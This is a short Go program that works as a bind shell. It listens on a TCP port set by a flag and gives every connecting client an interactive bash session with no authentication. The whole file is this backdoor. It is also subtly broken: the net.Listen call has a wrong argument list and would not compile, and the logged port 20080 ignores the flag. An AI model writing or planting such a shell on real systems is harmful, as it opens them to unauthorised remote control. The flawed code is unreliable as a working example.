package main

import (
	"flag"
	"io"
	"log"
	"net"
	"os/exec"
)

// handler function to execute commands
func handler(conn net.Conn) {
	cmd := exec.Command("/bin/bash", "-i")
	read_pipe, write_pipe := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = write_pipe
	go io.Copy(conn, read_pipe)
	cmd.Run()
	conn.Close()
}

func flags() string {
	var port string

	flag.StringVar(&port, "p", "", "Port to listen on. Use -h or --help for more")
	flag.Parse()

	return port

}

func main() {
	//Bind to tcp port 20080
	port_to_listen := flags()
	listener, err := net.Listen("tcp", ":", port_to_listen)
	if err != nil {
		log.Fatalln("Unable to Bind to port")
	}

	log.Println("Listening on 0.0.0.0:20080")

	for {
		// Wait for connection

		connection, err := listener.Accept()
		log.Println("Recieved Connection")
		if err != nil {
			log.Fatalln("unable to accept connection")
		}

		//Handle the connection. Uses goroutine for concurrency
		go handler(connection)
	}
}
